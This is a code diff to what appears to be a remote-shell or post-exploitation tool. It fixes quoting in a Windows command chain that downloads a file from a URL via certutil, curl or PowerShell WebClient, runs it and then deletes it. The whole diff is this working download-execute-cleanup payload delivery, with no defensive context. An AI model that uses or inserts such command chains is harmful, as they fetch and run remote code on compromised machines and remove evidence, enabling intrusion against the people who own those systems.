@@ -3623,7 +3623,7 @@ class Session:
 				data = self.exec(
 					f'(certutil -urlcache -split -f "{_url}" "{_dest}" >NUL 2>&1'
 					f' || curl -s -o "{_dest}" "{_url}" 2>NUL'
-					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\'{_url}\',\'{_dest}\')")'
+					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\\"{_url}\\",\\"{_dest}\\")")'
 					f'&"{_dest}"&del "{_dest}"',
 					force_cmd=True,
 					value=True,
@@ -3956,7 +3956,7 @@ class Session:
 				response = self.exec(
 					f'(certutil -urlcache -split -f "{_bat_url}" "{_bat_dest}" >NUL 2>&1'
 					f' || curl -s -o "{_bat_dest}" "{_bat_url}" 2>NUL'
-					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\'{_bat_url}\',\'{_bat_dest}\')")'
+					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\\"{_bat_url}\\",\\"{_bat_dest}\\")")'
 					f'&"{_bat_dest}"&del "{_bat_dest}"',
 					force_cmd=True, value=True, timeout=None)
 
